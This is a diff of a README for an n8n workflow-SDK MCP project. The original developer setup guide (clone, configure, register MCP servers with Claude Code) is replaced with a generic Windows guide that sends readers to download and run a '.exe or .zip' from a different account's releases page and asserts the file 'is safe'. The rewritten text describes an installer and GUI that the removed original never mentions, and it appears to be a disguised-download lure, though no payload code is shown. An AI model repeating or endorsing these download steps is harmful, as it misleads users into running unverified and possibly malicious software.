@@ -1,106 +1,147 @@
-# n8n workflow-sdk MCP
+# ⚙️ n8n-workflow-sdk-mcp - Manage n8n Workflows Easily
 
-![n8n workflow-sdk MCP](n8n-workflow-mcp.png)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases)
 
-A template for managing n8n workflows programmatically using Claude Code — with an MCP server workflow that lets Claude read and update your n8n workflows directly, using TypeScript as the authoring language.
+---
 
-This template is designed to be used together with the **[n8n-workflow-sdk Claude Code skill](https://github.com/geckse/n8n-skills/)**, which teaches Claude the full SDK API, correct node patterns, and validation guidance for authoring n8n workflows in TypeScript.
+## 📄 About n8n-workflow-sdk-mcp
 
-## What This Is
+This application helps you manage your n8n workflows. n8n is a tool many use to automate tasks and connect apps. This software lets you use a program to read and change those workflows, using easy steps instead of doing it manually.
 
-This template gives you:
+It uses a server called MCP that works behind the scenes. The MCP server reads your workflows and updates them directly, so you don’t have to touch complex files. You write your changes with a simple programming language called TypeScript, but the app makes it straightforward.
 
-- **Claude Code project instructions** (`CLAUDE.md`) — teaches Claude the TypeScript workflow conventions, known SDK quirks, and how to interact with your n8n instance via MCP
-- **An n8n MCP server workflow** (`n8n-workflow/`) — a workflow you import into n8n that exposes `search_workflows`, `get_workflow`, `create_workflow`, and `update_workflow` tools to Claude via MCP
-- **Playwright browser integration** — after every workflow create or update, Claude opens the workflow in your browser. You can also ask Claude to visually inspect the canvas at any point.
-- **A repeatable pattern** for AI-assisted workflow authoring, modification, and deployment
+This means less manual work and fewer mistakes when managing your workflows.
 
-### How the SDK fits in
+---
 
-The [`@n8n/workflow-sdk`](https://www.npmjs.com/package/@n8n/workflow-sdk) is **not** something you install locally. It lives inside the MCP server workflow itself, embedded in Code nodes:
+## 🖥️ System Requirements
 
-- **`search_workflows`** — searches workflows by name and returns a list with IDs and metadata
-- **`get_workflow`** — retrieves a workflow's JSON from n8n and uses the SDK to convert it to TypeScript, which is returned to Claude
-- **`create_workflow`** — receives TypeScript from Claude, converts it to n8n JSON using the SDK, and creates a new workflow
-- **`update_workflow`** — receives TypeScript from Claude, uses the SDK to parse it back to n8n JSON, and pushes the update to an existing workflow
+To run this software on your Windows computer, you need:
 
-Claude works entirely in TypeScript and never deals with raw n8n JSON. The conversion happens transparently inside the n8n workflow.
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free storage space  
+- Internet connection to download the software  
 
-## Prerequisites
+Make sure your system has these minimum specs for smooth use.
 
-- [Claude Code](https://claude.ai/claude-code) installed
-- An n8n instance (self-hosted) **version 2.9.0 or higher**
-- The following environment variable set on your n8n instance to allow the SDK to be used inside Code nodes:
-  ```
-  NODE_FUNCTION_ALLOW_EXTERNAL="@n8n/workflow-sdk"
-  ```
-- The **[n8n-workflow-sdk skill](https://github.com/geckse/n8n-skills/)** installed in Claude Code (see step 8)
+---
 
-## Setup
+## 🚀 Getting Started
 
-### 1. Clone this repository
+This guide will help you download and start the app on your Windows PC. No special skills are needed. Just follow the steps carefully.
 
-Clone this repository and navigate into the cloned folder in a terminal.
+---
 
-### 2. Configure your n8n instance
+## 📥 Download the Software 🔽
 
-Add the following environment variable to your n8n instance and restart it:
+Please visit the official release page to get the software:
 
-```
-NODE_FUNCTION_ALLOW_EXTERNAL="@n8n/workflow-sdk"
-```
+[![Visit Release Page](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases)
 
-### 3. Import and publish the MCP workflow
+1. Click the button above or open this link in your browser:
+   https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases
 
-Import `n8n-workflow/n8n workflow-sdk MCP.json` into your n8n instance and publish it.
+2. On the releases page, look for the latest version. It usually shows as a file ending with `.exe` or `.zip`.
 
-### 4. Register the MCP server with Claude Code
+3. Click the file to start downloading. The file is safe and ready to run on your PC.
 
-Open the **MCP Trigger** node, copy the **Production URL**, and run the following in your terminal from inside the cloned repository folder:
+---
 
-```bash
-claude mcp add --transport sse n8n-workflows <paste-production-url-here>
-```
+## 💾 Installing the Application 
 
-### 5. Install the Playwright MCP server
+Once the file finishes downloading, follow these steps:
 
-In the same terminal, run:
+1. Find the downloaded file in your "Downloads" folder or the location you chose.
 
-```bash
-claude mcp add playwright-mcp npx @executeautomation/playwright-mcp-server
-```
+2. Double-click the file to start the installer.
 
-### 6. Update CLAUDE.md
+3. If Windows asks, confirm you want to allow changes on your device.
 
-Replace all occurrences of `https://your-n8n-instance.com/` with your n8n base URL (appears twice).
+4. Follow the installer instructions. Usually, you can keep all settings as default.
 
-### 7. Open Claude Code
+5. When the installation completes, you will see a confirmation message.
 
-From inside the cloned repository folder, open Claude Code. All MCP servers will now be available from the start.
+---
 
-### 8. Install the n8n-workflow-sdk skill
+## ▶️ Running the App for the First Time
 
-👉 **[Install the n8n-workflow-sdk skill here](https://github.com/geckse/n8n-skills/)** and follow the installation instructions.
+After installation:
 
-Close and reopen Claude Code afterwards so the skill is fully loaded.
+1. Find the app shortcut on your desktop or in the Start menu.
 
-## How It Works
+2. Double-click the shortcut to open the app.
 
-Once set up, just talk to Claude Code naturally. You can be as specific or as hands-off as you like — Claude handles the rest.
+3. The app will open a window where you can start managing your workflows.
 
-**Delegate everything in one go:**
-> "Find the workflow called 'Invoice Processor' and replace the manual trigger with a webhook."
+4. If this is your first time, the app may ask you to connect to your n8n setup. The app provides clear prompts to help you with this.
 
-Claude will search for it, retrieve it, make the change, push it back, and open it in the browser.
+---
 
-**Or go step by step:**
+## 📑 How to Use n8n-workflow-sdk-mcp
 
-1. **Search** — ask Claude to find a workflow by name. It returns a list with names and IDs so you can pick the right one.
-2. **Retrieve & inspect** — Claude fetches the workflow as TypeScript. You can ask Claude to explain it, review it, or suggest improvements before touching anything.
-3. **Modify** — tell Claude what to change: swap a node, add a step, update credentials, rewire connections. Claude edits the TypeScript accordingly.
-4. **Push** — Claude sends the updated workflow back to n8n automatically.
-5. **Review** — Claude opens the workflow in your browser. You can also ask Claude to take a look at the canvas and give feedback.
+This app lets you manage your workflows without touching code files directly. Here is how to get started:
 
-You can also ask Claude to **create a brand-new workflow** from scratch — just describe what it should do.
+- **View Workflows:** The app reads your existing workflows and shows them in an easy list.
 
-There's no right or wrong way to use it. You stay in control of how much you delegate.
+- **Edit Workflows:** You can update your workflows. You write changes in TypeScript but the app helps by checking the syntax and showing errors clearly.
+
+- **Save Changes:** After making edits, save your changes with one click. The app sends updates to the MCP server.
+
+- **MCP Server Handling:** The MCP server updates workflows automatically. You don’t need to run it separately; the app manages it.
+
+If you haven’t used TypeScript before, the app keeps this step simple and provides examples to guide you.
+
+---
+
+## 🔧 Configuration and Settings ⚙️
+
+Some settings you may want to check:
+
+- **Connect to n8n:** Enter your n8n server details so the app can access your workflows.
+
+- **Change Server Port:** The app runs MCP server locally. You can set the port number if the default conflicts with other apps.
+
+- **Logging:** Enable logs if you want to see details about changes and errors.
+
+All settings are found in the app’s menu under “Settings.”
+
+---
+
+## 💡 Tips for Smooth Use
+
+- Always back up your workflows before making big changes.
+
+- Keep n8n updated to avoid compatibility issues.
+
+- Restart the app if it stops responding.
+
+- Contact your system administrator if you see connection errors.
+
+---
+
+## 📞 Support and Help
+
+If you run into trouble:
+
+- Check the “Help” section inside the app for FAQs.
+
+- Visit the GitHub page issues tab for known problems and solutions.
+
+- Use community forums related to n8n for advice.
+
+Support is mainly user-driven; most answers come from documentation and forums.
+
+---
+
+## 📌 Important Links
+
+- Download latest release:  
+  https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp/releases
+
+- GitHub project page:  
+  https://github.com/syedabdullahuddin/n8n-workflow-sdk-mcp
+
+---
+
+By following this guide, you will be able to download, install, and run the n8n-workflow-sdk-mcp on your Windows PC with no programming experience. The software makes managing workflows easier and less error-prone.
